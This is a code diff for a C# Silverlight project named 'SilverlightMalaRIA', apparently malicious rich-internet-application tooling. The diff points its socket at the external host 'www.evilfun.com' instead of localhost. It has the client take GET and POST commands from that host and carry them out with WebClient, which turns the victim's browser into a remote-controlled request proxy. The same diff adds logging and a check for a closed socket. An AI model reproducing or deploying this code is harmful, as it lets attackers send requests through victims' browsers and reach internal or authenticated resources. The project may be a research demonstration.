@@ -15,7 +15,7 @@ namespace SilverlightMalaRIA
     {
         //Config
         private const int Port = 4502;
-        private const string Hostname = "localhost";
+        private const string Hostname = "www.evilfun.com";
 
 
         private readonly Socket _socket;
@@ -70,14 +70,15 @@ namespace SilverlightMalaRIA
             {
                 try
                 {
-                    Log("Trying: [" + match.Groups[2].Value + "]");
                     var client = new WebClient();
                     if (match.Groups[1].Value == "GET")
                     {
+                        Log("Trying: [" + match.Groups[1].Value + " " + match.Groups[2].Value + "]");
                         client.OpenReadCompleted += OnGetCompleted;
                         client.OpenReadAsync(new Uri(match.Groups[2].Value));
                     } else
                     {
+                        Log("Trying: [" + match.Groups[1].Value + " " + match.Groups[2].Value + "] data [" + match.Groups[5].Value + "]");
                         client.UploadStringCompleted += OnPostCompleted;
                         client.UploadStringAsync(new Uri(match.Groups[2].Value), "POST", match.Groups[5].Value);
                     }
@@ -90,7 +91,13 @@ namespace SilverlightMalaRIA
             else
             {
                 Log("Don't understand : {" + message + "}");
-                HandleIncomingTraffic();
+                if (_socket.Connected)
+                {
+                    HandleIncomingTraffic();
+                } else
+                {
+                    Log("Socket closed");
+                }
             }
         }
 
